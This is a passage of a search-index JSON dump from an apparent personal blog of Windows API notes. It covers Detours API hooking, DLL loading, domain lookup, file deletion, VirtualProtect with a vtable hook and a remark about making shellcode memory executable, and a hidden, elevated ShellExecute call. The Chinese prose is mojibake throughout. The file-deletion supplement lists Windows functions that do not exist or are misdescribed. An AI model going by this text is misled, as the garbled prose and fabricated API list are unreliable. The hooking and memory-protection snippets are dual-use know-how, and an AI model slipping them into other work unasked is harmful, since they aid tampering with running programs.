(_g_inner_msg);&#125;","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"API","slug":"A-OS/Windows/API","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/API/"}]},{"title":"Detoursçš„ä½¿ç”¨","date":"2023-10-27T01:24:01.948Z","path":"A_OS/Windows/å·¥å…·/ã€winã€‘Detours/","text":"æ¦‚è¿°ï¼šDetours çš„è¯´æ˜å’Œç®€å•ä½¿ç”¨ Detours Detours æ˜¯å¾®è½¯æä¾›çš„ä¸€å¥—å·¥å…·ï¼Œä¸»è¦ç”¨äºwin32 APIçš„æ‹¦æˆª Githubï¼šmicrosoft/Detours: Detours is a software package for monitoring and instrumenting API calls on Windows. It is distributed in source code form. ä»“åº“ä¸­æœ‰æŒºå¤šç¤ºä¾‹ç¨‹åºå¯ä¾›å‚è€ƒã€‚ ä½¿ç”¨ Detours çš„å¤§è‡´æµç¨‹ï¼š åœ¨ Detours çš„å·¥ä½œè¿‡ç¨‹ä¸­ï¼ŒDetourTransactionBegin å‡½æ•°é¦–å…ˆç”¨äºå¯åŠ¨ä¸€ä¸ªæˆªè·ï¼ˆHookï¼‰æˆ–è§£é™¤æˆªè·ï¼ˆUnhookï¼‰çš„è¿‡ç¨‹ï¼Œè¿™ä¸ªè¿‡ç¨‹ä¸­å¯èƒ½åŒ…å«å¯¹å¤šä¸ªå‡½æ•°çš„ä¿®æ”¹ã€‚ç„¶åï¼Œå¼€å‘è€…å¯ä»¥ä½¿ç”¨ DetourAttach æˆ– DetourAttachEx å‡½æ•°å°† Detour é’©å­é™„åŠ åˆ°ç›®æ ‡å‡½æ•°ä¸Šï¼Œæˆ–ä½¿ç”¨ DetourDetach å‡½æ•°å°†é’©å­ä»ç›®æ ‡å‡½æ•°ä¸­åˆ†ç¦»å‡ºæ¥ã€‚ ç›¸å…³å‡½æ•°è¯´æ˜ DetourUpdateThread å‡½æ•°è¯´æ˜ DetourUpdateThread å‡½æ•°æ˜¯ Detours åº“ä¸­çš„ä¸€ä¸ªé‡è¦å‡½æ•°ï¼Œç”¨äºåœ¨ Detour äº‹åŠ¡å¤„ç†è¿‡ç¨‹ä¸­å°†ç‰¹å®šçš„çº¿ç¨‹åˆ—å…¥æ›´æ–°èŒƒå›´ã€‚Detours æ˜¯ä¸€ä¸ªç”¨äºåœ¨è¿è¡Œæ—¶ä¿®æ”¹äºŒè¿›åˆ¶ä»£ç ï¼ˆå¦‚å‡½æ•°é’©å­ï¼‰çš„åº“ï¼Œå®ƒå…è®¸å¼€å‘è€…åœ¨ä¸ä¿®æ”¹åŸå§‹ä»£ç çš„æƒ…å†µä¸‹ï¼Œæ‹¦æˆªå’Œä¿®æ”¹å‡½æ•°çš„æ‰§è¡Œæµç¨‹ã€‚ DetourUpdateThread å‡½æ•°çš„ä½œç”¨æ˜¯åœ¨è¿™ä¸ªäº‹åŠ¡è¿‡ç¨‹ä¸­ï¼Œå°†ä¸€ä¸ªæˆ–å¤šä¸ªçº¿ç¨‹åˆ—å…¥éœ€è¦æ›´æ–°çš„èŒƒå›´ã€‚è¿™æ˜¯å› ä¸ºåœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸­ï¼Œç›´æ¥ä¿®æ”¹å‡½æ•°çš„ä»£ç å¯èƒ½ä¼šå¯¼è‡´ç«æ€æ¡ä»¶ï¼Œå³ä¸€ä¸ªçº¿ç¨‹æ­£åœ¨æ‰§è¡ŒåŸå§‹ä»£ç æ—¶ï¼Œå¦ä¸€ä¸ªçº¿ç¨‹å¯èƒ½å·²ç»ä¿®æ”¹äº†è¯¥ä»£ç ã€‚é€šè¿‡ DetourUpdateThread å°†çº¿ç¨‹åˆ—å…¥æ›´æ–°èŒƒå›´ï¼ŒDetours åº“å¯ä»¥ç¡®ä¿åœ¨äº‹åŠ¡æäº¤æ—¶ï¼Œæ‰€æœ‰ç›¸å…³çº¿ç¨‹çš„ä»£ç éƒ½è¢«æ­£ç¡®åœ°æ›´æ–°ï¼Œä»è€Œé¿å…ç«æ€æ¡ä»¶ã€‚ å…·ä½“æ¥è¯´ï¼ŒDetourUpdateThread å‡½æ•°çš„ä½œç”¨æ˜¯ï¼š å°†æŒ‡å®šçš„çº¿ç¨‹åŠ å…¥åˆ° Detour äº‹åŠ¡çš„æ›´æ–°åˆ—è¡¨ä¸­ã€‚ åœ¨äº‹åŠ¡æäº¤æ—¶ï¼ŒDetours åº“ä¼šéå†è¿™ä¸ªæ›´æ–°åˆ—è¡¨ï¼Œå¹¶å¯¹åˆ—è¡¨ä¸­çš„æ¯ä¸ªçº¿ç¨‹æ‰§è¡Œå¿…è¦çš„ä»£ç æ›´æ–°æ“ä½œã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨è°ƒç”¨ DetourTransactionCommit æˆ– DetourTransactionCommitEx å‡½æ•°æäº¤äº‹åŠ¡ä¹‹å‰ï¼Œæ‰€æœ‰çš„é™„åŠ ã€åˆ†ç¦»å’Œçº¿ç¨‹æ›´æ–°æ“ä½œéƒ½ä¸ä¼šç”Ÿæ•ˆã€‚ä¸€æ—¦äº‹åŠ¡è¢«æäº¤ï¼Œæ‰€æœ‰çš„ä¿®æ”¹å°±ä¼šç«‹å³ç”Ÿæ•ˆï¼Œæ‰€æœ‰ç›¸å…³çº¿ç¨‹çš„ä»£ç éƒ½ä¼šè¢«æ›´æ–°ä»¥åæ˜ è¿™äº›ä¿®æ”¹ã€‚ å› æ­¤ï¼ŒDetourUpdateThread å‡½æ•°æ˜¯ Detours åº“ä¸­ç”¨äºç¡®ä¿å¤šçº¿ç¨‹ç¯å¢ƒä¸‹ä»£ç ä¿®æ”¹ä¸€è‡´æ€§å’Œå®‰å…¨æ€§çš„é‡è¦å·¥å…·ä¹‹ä¸€ã€‚ å¯ä»¥çœ‹ä¸‹ DetourUpdateThread çš„æºç ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041LONG WINAPI DetourUpdateThread(_In_ HANDLE hThread)&#123; LONG error; // If any of the pending operations failed, then we don&#x27;t need to do this. if (s_nPendingError != NO_ERROR) &#123; return s_nPendingError; &#125; // Silently (and safely) drop any attempt to suspend our own thread. if (hThread == GetCurrentThread()) &#123; return NO_ERROR; &#125; DetourThread *t = new NOTHROW DetourThread; if (t == NULL) &#123; error = ERROR_NOT_ENOUGH_MEMORY; fail: if (t != NULL) &#123; delete t; t = NULL; &#125; s_nPendingError = error; s_ppPendingError = NULL; DETOUR_BREAK(); return error; &#125; if (SuspendThread(hThread) == (DWORD)-1) &#123; error = GetLastError(); DETOUR_BREAK(); goto fail; &#125; t-&gt;hThread = hThread; t-&gt;pNext = s_pPendingThreads; s_pPendingThreads = t; return NO_ERROR;&#125; hookDemo ä¿®æ”¹ GetLocalTime ï¼Œä½¿å…¶è¿”å›çš„åˆ†é’Ÿæ•°ä¸º 52 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;iostream&gt;#include &lt;Windows.h&gt;//åŒ…å«Detourçš„å¤´æ–‡ä»¶å’Œåº“æ–‡ä»¶#include &quot;detours.h&quot;#pragma comment (lib,&quot;detours.lib&quot;)using namespace std;//ä¿å­˜å‡½æ•°åŸå‹ï¼ˆç”¨æŒ‡é’ˆå­˜å‚¨è¦æ‹¦æˆªçš„APIï¼‰void (*OldGetLocalTime)(LPSYSTEMTIME) = GetLocalTime;//æ‹¦æˆªåè¦æ‰§è¡Œçš„æ“ä½œï¼ˆè¿™é‡Œæ˜¯å°†æ—¶é—´çš„åˆ†æ”¹ä¸º52ï¼‰void NewGetLocalTime(LPSYSTEMTIME lpSystemTime) &#123; OldGetLocalTime(lpSystemTime); lpSystemTime-&gt;wMinute = 52;&#125;//ä¸‹é’©å­å‡½æ•°void StartHook() &#123; //å¼€å§‹äº‹åŠ¡ DetourTransactionBegin(); //æ›´æ–°çº¿ç¨‹ä¿¡æ¯ DetourUpdateThread(GetCurrentThread()); //å°†æ‹¦æˆªçš„å‡½æ•°é™„åŠ åˆ°åŸå‡½æ•°çš„åœ°å€ä¸Š DetourAttach(&amp;(PVOID&amp;)OldGetLocalTime, NewGetLocalTime); //ç»“æŸäº‹åŠ¡ DetourTransactionCommit();&#125;//æ’¤é’©å­å‡½æ•°void EndHook() &#123; //å¼€å§‹detoursäº‹åŠ¡ DetourTransactionBegin(); //æ›´æ–°çº¿ç¨‹ä¿¡æ¯ DetourUpdateThread(GetCurrentThread()); //å°†æ‹¦æˆªçš„å‡½æ•°ä»åŸå‡½æ•°çš„åœ°å€ä¸Šè§£é™¤ DetourDetach(&amp;(PVOID&amp;)OldGetLocalTime, NewGetLocalTime); //ç»“æŸdetoursäº‹åŠ¡ DetourTransactionCommit();&#125;int main()&#123; //è·å–æœ¬åœ°æ—¶é—´ SYSTEMTIME time, time2; GetLocalTime(&amp;time); cout &lt;&lt; time.wHour &lt;&lt; &quot;:&quot; &lt;&lt; time.wMinute &lt;&lt; endl; //ä¸‹é’©å­ StartHook(); //ä¸‹é’©å­åå†æ¬¡è·å–æœ¬åœ°æ—¶é—´ GetLocalTime(&amp;time2); cout &lt;&lt; time2.wHour &lt;&lt; &quot;:&quot; &lt;&lt; time2.wMinute &lt;&lt; endl; //æ’¤é’©å­ EndHook(); return 0;&#125;","tags":[{"name":"hook","slug":"hook","permalink":"https://hodlyounger.github.io/tags/hook/"},{"name":"Detours","slug":"Detours","permalink":"https://hodlyounger.github.io/tags/Detours/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"å·¥å…·","slug":"A-OS/Windows/å·¥å…·","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E5%B7%A5%E5%85%B7/"}]},{"title":"ã€Winã€‘åŠ è½½åŠ¨æ€åº“ (loadlibrary)","date":"2023-10-27T01:24:01.947Z","path":"A_OS/Windows/API/ã€winapiã€‘API_åŠ è½½åŠ¨æ€åº“/","text":"æ¦‚è¿°ï¼šé€šè¿‡ using ç»™å¯¼å‡ºå‡½æ•°èµ·åˆ«å [toc] åŠ è½½ usingçš„ç”¨æ³•å‚è€ƒ ä½¿ç”¨usingèµ·åˆ«å 12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;#include &lt;windows.h&gt;#include &quot;PipeIPC/PipeIPC.h&quot;int main()&#123; std::cout &lt;&lt; &quot;--- DLL Test ---\\n&quot;; HINSTANCE hDLL; // Handle to DLL using Face = int * (*)(int,int); hDLL = LoadLibrary(L&quot;mydll.dll&quot;); if (hDLL != NULL) &#123; Face faceSum = (Face)GetProcAddress(hDLL, &quot;mySum&quot;); if (!faceSum) &#123; // handle the error FreeLibrary(hDLL); return 0; &#125; else &#123; // call the function faceSum(1,1); &#125; &#125; return 0;&#125; ç”ŸæˆåŠ¨æ€åº“ dllmain.cpp 1234567891011121314151617181920212223#ifdef __cplusplusextern &quot;C&quot;&#123;#endif #define MYIMAPI extern &quot;C&quot; __declspec(dllimport)#define MYEXAPI extern &quot;C&quot; __declspec(dllexport)#ifdef __cplusplus&#125;#endifMYEXAPI int Add(int numa, int numb)&#123; return numa + numb;&#125;MYEXAPI int Sub(int numa, int numb)&#123; return (numa - numb);&#125;","tags":[{"name":"Windows","slug":"Windows","permalink":"https://hodlyounger.github.io/tags/Windows/"},{"name":"DLL","slug":"DLL","permalink":"https://hodlyounger.github.io/tags/DLL/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"API","slug":"A-OS/Windows/API","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/API/"}]},{"title":"ã€WINAPIã€‘ç³»ç»Ÿè·å–ç³»ç»Ÿä¸»æœºåŸŸå","date":"2023-10-27T01:24:01.946Z","path":"A_OS/Windows/API/ã€winapiã€‘è·å–ç³»ç»ŸåŸŸå/","text":"æ¦‚è¿°ï¼šwindowsæ“ä½œç³»ç»Ÿä¸‹è·å–ä¸»æœºåŸŸå ä¸»è¦è°ƒç”¨ DsRoleGetPrimaryDomainInformation è¿™ä¸ªå‡½æ•°ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738// GetDominName.cpp : è·å–ä¸»æœºåŸŸå//#include &lt;Windows.h&gt;#include &lt;DSRole.h&gt;#pragma comment(lib, &quot;netapi32.lib&quot;)#include &lt;stdio.h&gt;int main(int argc, char ** argv)&#123; DSROLE_PRIMARY_DOMAIN_INFO_BASIC * info; DWORD dw; dw = DsRoleGetPrimaryDomainInformation(NULL, DsRolePrimaryDomainInfoBasic, (PBYTE *)&amp;info); if (dw != ERROR_SUCCESS) &#123; wprintf(L&quot;DsRoleGetPrimaryDomainInformation: %u\\n&quot;, dw); return dw; &#125; if (info-&gt;DomainNameDns == NULL) &#123; wprintf(L&quot;DomainNameDns is NULL\\n&quot;); &#125; else &#123; wprintf(L&quot;DomainNameDns: %s\\n&quot;, info-&gt;DomainNameDns); &#125; system(&quot;pause&quot;); return 0;&#125; è¾“å‡ºç¤ºä¾‹ï¼š","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"winapi","slug":"winapi","permalink":"https://hodlyounger.github.io/tags/winapi/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"API","slug":"A-OS/Windows/API","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/API/"}]},{"title":"ã€winapiã€‘åˆ é™¤æ–‡ä»¶å¤¹ä¸‹æ‰€æœ‰æ–‡ä»¶","date":"2023-10-27T01:24:01.945Z","path":"A_OS/Windows/API/ã€winapiã€‘åˆ é™¤æ–‡ä»¶ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶/","text":"æ¦‚è¿°ï¼š è°ƒç”¨ Windows API éå†ã€åˆ é™¤æ–‡ä»¶ï¼Œæ¶‰åŠåˆ°çš„APIæ¥å£ï¼š deletefileã€RemoveDirectoryã€MoveFileExAã€ MoveFile 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;string&gt;#include &lt;windows.h&gt;#include &lt;winbase.h&gt;#include &lt;WinUser.h&gt;#include &lt;strsafe.h&gt;#include &lt;ShObjIdl.h&gt;#include &lt;cstring&gt;#include &lt;shlobj.h&gt;#include &lt;comutil.h&gt; #include &lt;io.h&gt;#pragma comment(lib, &quot;comsuppw.lib&quot;)#pragma comment(linker, &quot;/entry:mainCRTStartup&quot;) // è®¾ç½®ç³»ç»Ÿé‡å¯æ—¶åˆ é™¤bool _SetFileRebootDelete(const std::string&amp; file_path) &#123; if (MoveFileExA(file_path.c_str(), 0, MOVEFILE_DELAY_UNTIL_REBOOT)) &#123; return true; &#125; else &#123; return false; &#125;&#125;void getFiles(std::string path, std::vector&lt;std::string&gt;&amp; files, std::vector&lt;std::string&gt;&amp; names)&#123; //æ–‡ä»¶å¥æŸ„ï¼Œwin10ç”¨long longï¼Œwin7ç”¨longå°±å¯ä»¥äº† long hFile = 0; //æ–‡ä»¶ä¿¡æ¯ struct _finddata_t fileinfo; std::string p; if ((hFile = _findfirst(p.assign(path).append(&quot;\\\\*&quot;).c_str(), &amp;fileinfo)) != -1) &#123; do &#123; //å¦‚æœæ˜¯ç›®å½•,è¿­ä»£ä¹‹ //å¦‚æœä¸æ˜¯,åŠ å…¥åˆ—è¡¨ if ((fileinfo.attrib &amp; _A_SUBDIR)) &#123; if (strcmp(fileinfo.name, &quot;.&quot;) != 0 &amp;&amp; strcmp(fileinfo.name, &quot;..&quot;) != 0) &#123; getFiles(p.assign(path).append(&quot;\\\\&quot;).append(fileinfo.name), files, names); &#125; &#125; else &#123; files.push_back(p.assign(path).append(&quot;\\\\&quot;).append(fileinfo.name)); names.push_back(fileinfo.name); &#125; &#125; while (_findnext(hFile, &amp;fileinfo) == 0); _findclose(hFile); &#125;&#125;std::string GetLoactionDir()&#123; DWORD dwLen = 0; CHAR szAppDataDir[MAX_PATH]; dwLen = ExpandEnvironmentStringsA(&quot;%programdata%&quot;, szAppDataDir, MAX_PATH); if (dwLen != 0) &#123; StringCchCatA(szAppDataDir, sizeof(szAppDataDir), (&quot;\\\\TrustAgent\\\\logs&quot;)); &#125; return szAppDataDir;&#125;int GetWithRegex() &#123; // å®šä¹‰æ–‡ä»¶æŸ¥æ‰¾å¥æŸ„å’ŒæŸ¥æ‰¾æ¡ä»¶ WIN32_FIND_DATAA findData; HANDLE hFind = INVALID_HANDLE_VALUE; LPCSTR lpPath = &quot;D:\\\\Documents\\\\B_Tools\\\\&quot;; // æŸ¥æ‰¾è·¯å¾„ï¼Œè¿™é‡Œä»¥Cç›˜æ ¹ç›®å½•ä¸ºä¾‹ LPCSTR lpPattern = &quot;*.7z&quot;; // æŸ¥æ‰¾æ¨¡å¼ï¼Œè¿™é‡ŒåŒ¹é…æ‰€æœ‰æ–‡ä»¶ char buffer_1[MAX_PATH] = &quot;&quot;; char* lpStr1; lpStr1 = buffer_1; PathCombineA(lpStr1, lpPath, lpPattern); // è°ƒç”¨FindFirstFileå‡½æ•°å¼€å§‹æŸ¥æ‰¾æ–‡ä»¶ hFind = FindFirstFileA(lpStr1, &amp;findData); if (hFind == INVALID_HANDLE_VALUE) &#123; std::cout &lt;&lt; &quot;FindFirstFile failed with error: &quot; &lt;&lt; GetLastError() &lt;&lt; std::endl; return 1; &#125; // å¾ªç¯éå†æŸ¥æ‰¾ç»“æœå¹¶è¾“å‡ºæ–‡ä»¶å do &#123; std::cout &lt;&lt; findData.cFileName &lt;&lt; std::endl; &#125; while (FindNextFileA(hFind, &amp;findData)); // å…³é—­æ–‡ä»¶æŸ¥æ‰¾å¥æŸ„ FindClose(hFind); return 0;&#125;int main()&#123; using namespace std; std::string filepath = GetLoactionDir(); vector&lt;string&gt; files; vector&lt;string&gt; names; getFiles(filepath, files, names); for (int i = 0; i &lt; files.size(); i++) &#123; printf(&quot;-----========files:%d========---\\n&quot;, i); // cout &lt;&lt; &quot;files&quot; &lt;&lt; i &lt;&lt; &#x27;:&#x27; &lt;&lt; files[i] &lt;&lt; endl; // wstring wsName; // wsName = string2wstring(files[i]); cout &lt;&lt; &quot;lnkPath: &quot; &lt;&lt; files[i] &lt;&lt; endl; // wstring wsDestPath = getLnkFormPath(wsName); // cout &lt;&lt; &quot;destPath:&quot;; // wcout &lt;&lt; wsDestPath; // cout &lt;&lt; endl; _SetFileRebootDelete(files[i]); &#125; return 0;&#125; deletefile 123456789101112131415161718#include &lt;Windows.h&gt; int main() &#123; LPCWSTR filePath = L&quot;C:\\\\Path\\\\To\\\\File.txt&quot;; if (DeleteFile(filePath)) &#123; // æ–‡ä»¶åˆ é™¤æˆåŠŸ printf(&quot;æ–‡ä»¶åˆ é™¤æˆåŠŸï¼\\n&quot;); &#125; else &#123; // æ–‡ä»¶åˆ é™¤å¤±è´¥ printf(&quot;æ–‡ä»¶åˆ é™¤å¤±è´¥ï¼\\n&quot;); &#125; return 0; &#125; RemoveDirectory 123456789101112131415161718#include &lt;Windows.h&gt; int main() &#123; LPCWSTR directoryPath = L&quot;C:\\\\Path\\\\To\\\\Directory&quot;; if (RemoveDirectory(directoryPath)) &#123; // ç›®å½•åˆ é™¤æˆåŠŸ printf(&quot;ç›®å½•åˆ é™¤æˆåŠŸï¼\\n&quot;); &#125; else &#123; // ç›®å½•åˆ é™¤å¤±è´¥ printf(&quot;ç›®å½•åˆ é™¤å¤±è´¥ï¼\\n&quot;); &#125; return 0; &#125; è¡¥å…… é™¤äº†DeleteFileå’ŒRemoveDirectoryä¹‹å¤–ï¼ŒWindows API è¿˜æä¾›äº†å…¶ä»–ä¸€äº›ç”¨äºåˆ é™¤æ–‡ä»¶æˆ–ç›®å½•çš„å‡½æ•°ã€‚ä»¥ä¸‹æ˜¯å…¶ä¸­ä¸€äº›å¸¸ç”¨çš„å‡½æ•°ï¼š DeleteVolumeMountPoint: è¯¥å‡½æ•°ç”¨äºåˆ é™¤ä¸€ä¸ªè£…è½½ç‚¹çš„æ‰€æœ‰å·è£…ä¿¡æ¯ã€‚ RemoveDirectoryEx: è¯¥å‡½æ•°ç”¨äºåˆ é™¤ä¸€ä¸ªç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•å’Œæ–‡ä»¶ã€‚ RemoveFile: è¯¥å‡½æ•°ç”¨äºåˆ é™¤ä¸€ä¸ªæ–‡ä»¶ï¼Œä½†ä¸ä¼šåˆ é™¤ä¸è¯¥æ–‡ä»¶å…³è”çš„ç›®å½•ã€‚ MoveFile: è¯¥å‡½æ•°å¯ä»¥å°†ä¸€ä¸ªæ–‡ä»¶æˆ–ç›®å½•ä»ä¸€ä¸ªä½ç½®ç§»åŠ¨åˆ°å¦ä¸€ä¸ªä½ç½®ï¼Œå¦‚æœç›®æ ‡ä½ç½®å·²ç»å­˜åœ¨åŒåæ–‡ä»¶æˆ–ç›®å½•ï¼Œåˆ™ä¼šè‡ªåŠ¨å°†å…¶è¦†ç›–ã€‚ MoveFileEx: è¯¥å‡½æ•°å¯ä»¥å°†ä¸€ä¸ªæ–‡ä»¶æˆ–ç›®å½•ä»ä¸€ä¸ªä½ç½®ç§»åŠ¨åˆ°å¦ä¸€ä¸ªä½ç½®ï¼ŒåŒæ—¶å¯ä»¥æŒ‡å®šä¸åŒçš„è¦†ç›–è¡Œä¸ºã€‚ SetFileAttributes: è¯¥å‡½æ•°å¯ä»¥è®¾ç½®ä¸€ä¸ªæ–‡ä»¶æˆ–ç›®å½•çš„å±æ€§ï¼Œä¾‹å¦‚åªè¯»ã€éšè—ã€ç³»ç»Ÿç­‰ã€‚ DeleteFileTransacted: è¯¥å‡½æ•°å¯ä»¥åˆ é™¤ä¸€ä¸ªæ–‡ä»¶ï¼Œå¹¶å°†å…¶ä»å›æ”¶ç«™ä¸­æ¸…ç©ºã€‚ DeleteSubdirectoriesAndFiles: è¯¥å‡½æ•°å¯ä»¥åˆ é™¤ä¸€ä¸ªç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•å’Œæ–‡ä»¶ï¼Œå¹¶å°†å…¶ä»å›æ”¶ç«™ä¸­æ¸…ç©ºã€‚","tags":[{"name":"API","slug":"API","permalink":"https://hodlyounger.github.io/tags/API/"},{"name":"Windows/æ–‡ä»¶","slug":"Windows-æ–‡ä»¶","permalink":"https://hodlyounger.github.io/tags/Windows-%E6%96%87%E4%BB%B6/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"API","slug":"A-OS/Windows/API","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/API/"}]},{"title":"ã€winapiã€‘VirtualProtect å‡½æ•°","date":"2023-10-27T01:24:01.941Z","path":"A_OS/Windows/API/ã€winapiã€‘VirtualProtect/","text":"æ¦‚è¿°ï¼šVirtualProtect å‡½æ•°çš„è¯´æ˜å’Œä½¿ç”¨ è¯´æ˜ VirtualProtect å‡½æ•°ä¸»è¦ç”¨äºæ”¹å˜å†…å­˜åœ°å€æ‰€åœ¨é¡µçš„é¡µå±æ€§ã€‚ 123456BOOL VirtualProtect( LPVOID lpAddress, DWORD dwSize, DWORD flNewProtect, PDWORD lpflOldProtect ); å„å‚æ•°çš„æ„ä¹‰ä¸ºï¼š lpAddressï¼Œè¦æ”¹å˜å±æ€§çš„å†…å­˜èµ·å§‹åœ°å€ã€‚ dwSizeï¼Œè¦æ”¹å˜å±æ€§çš„å†…å­˜åŒºåŸŸå¤§å°ã€‚ flNewProtectï¼Œå†…å­˜æ–°çš„å±æ€§ç±»å‹ï¼Œè®¾ç½®ä¸ºPAGE_EXECUTE_READWRITEï¼ˆ0x40ï¼‰æ—¶è¯¥å†…å­˜é¡µä¸ºå¯è¯»å¯å†™å¯æ‰§è¡Œã€‚ pflOldProtectï¼Œå†…å­˜åŸå§‹å±æ€§ç±»å‹ä¿å­˜åœ°å€ã€‚ ä¿®æ”¹å†…å­˜å±æ€§æˆåŠŸæ—¶å‡½æ•°è¿”å›é0ï¼Œä¿®æ”¹å¤±è´¥æ—¶è¿”å›0ã€‚ å¦‚æœæˆ‘ä»¬èƒ½å¤ŸæŒ‰ç…§å¦‚ä¸‹å‚æ•°å¸ƒç½®å¥½æ ˆå¸§çš„è¯å°±å¯ä»¥å°†shellcodeæ‰€åœ¨å†…å­˜åŒºåŸŸè®¾ç½®ä¸ºå¯æ‰§è¡Œæ¨¡å¼ã€‚ ç¤ºä¾‹ å¦‚ä¸‹æ‰€ç¤ºä¸º Hook è™šå‡½æ•°ï¼Œå¹¶ä½¿å…¶è°ƒç”¨è‡ªå·±çš„å‡½æ•°ã€‚åœ¨æ”¹å†™è°ƒç”¨ä¹‹å‰ä½¿ç”¨äº† VirtualProtect å‡½æ•°å¯¹ç›¸å…³å†…å­˜åŒºåŸŸçš„å±æ€§è¿›è¡Œäº†ä¿®æ”¹ã€‚ 1234567891011121314151617181920212223242526272829303132333435#include &lt;iostream&gt;#include &lt;windows.h&gt;class Base &#123;public: virtual void Print() &#123; printf(&quot;gyarmy.com\\n&quot;); &#125;&#125;;void hookPrint() &#123; printf(&quot;hook_gyarmy\\n&quot;);&#125;int main(int argc, char* argv[])&#123; Base* pb = new Base(); //å…³é”®å®šä½è™šè¡¨çš„ä½ç½® DWORD* pVtAddr = (DWORD*)*(DWORD*)pb; DWORD dwOldProtect = 0; VirtualProtect(pVtAddr, 4, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect); *pVtAddr = (DWORD)hookPrint; pb-&gt;Print(); delete pb; return 0;&#125;","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"API","slug":"A-OS/Windows/API","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/API/"}]},{"title":"ã€winapiã€‘ShellExecute","date":"2023-10-27T01:24:01.940Z","path":"A_OS/Windows/API/ã€winapiã€‘ShellExecute/","text":"æ¦‚è¿°ï¼š ShellExecute ç”¨æ³•çš„æ•´ç†å’Œç¤ºä¾‹ å®˜æ–¹è¯´æ˜ï¼šshellExecuteA å‡½æ•° (shellapi.h) - Win32 apps | Microsoft Learn ç”¨æ³•ç¤ºä¾‹ ä»¥ä¸‹ç¤ºä¾‹ä¸ºä¸€ä¸ªå®Œæ•´çš„ç”¨æ³•å±•ç¤ºï¼Œå®ç°äº†è°ƒç”¨ç¬¬ä¸‰æ–¹å·¥å…· devocn.exe å®‰è£…è™šæ‹Ÿç½‘å¡ï¼ˆä¸å±•ç¤ºå®‰è£…ç•Œé¢ï¼‰å¹¶é€šè¿‡è·å–å®‰è£…è¿›ç¨‹å¥æŸ„åˆ¤æ–­å®‰è£…ç»“æœã€‚ SEE_MASK_NOCLOSEPROCESS å‚æ•°ï¼šè¡¨ç¤ºè¦è·å–è¿›ç¨‹å¥æŸ„ é€šè¿‡ GetExitCodeProcess å‡½æ•°è·å–è¿›ç¨‹æ‰§è¡ŒçŠ¶æ€ SW_HIDE å‚æ•°: ä¸å±•ç¤ºçª—å£ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889#define QREINSTALL_NETCARD_TOOLS_NAME L&quot;devcon.exe&quot;std::mutex g_mutex_nc_install;bool InstallNcDrive(bool &amp;bRes, bool &amp;bEnd) &#123; std::lock_guard&lt;std::mutex&gt; lock(g_mutex_nc_install); bool bOptRt = false; //è§¦å‘é‡æ–°å®‰è£…è™šæ‹Ÿç½‘å¡ TCHAR szPath[MAX_PATH]; ::GetModuleFileName(NULL, szPath, MAX_PATH); ::PathRemoveFileSpec(szPath); QLOG_INFO() &lt;&lt; &quot;tools[devcon.exe]&#x27;s path is&quot; &lt;&lt; QString::fromWCharArray(szPath); std::string command = &quot; install vpnvnic.inf vpnvnic&quot;; SHELLEXECUTEINFO ShExecInfoInstall = &#123; 0 &#125;; try &#123; ShExecInfoInstall.cbSize = sizeof(SHELLEXECUTEINFO); ShExecInfoInstall.fMask = SEE_MASK_NOCLOSEPROCESS; ShExecInfoInstall.hwnd = NULL; if (!isProcessAdmin()) &#123; ShExecInfoInstall.lpVerb = L&quot;runas&quot;; &#125; else &#123; ShExecInfoInstall.lpVerb = L&quot;open&quot;; &#125; ShExecInfoInstall.lpFile = QREINSTALL_NETCARD_TOOLS_NAME; ShExecInfoInstall.lpParameters = STDString2LPCWCH(command); ShExecInfoInstall.lpDirectory = szPath; ShExecInfoInstall.nShow = SW_HIDE; ShExecInfoInstall.hInstApp = NULL; ShExecInfoInstall.hProcess = NULL; bOptRt = ShellExecuteEx(&amp;ShExecInfoInstall); if (bOptRt) &#123; QLOG_INFO() &lt;&lt; 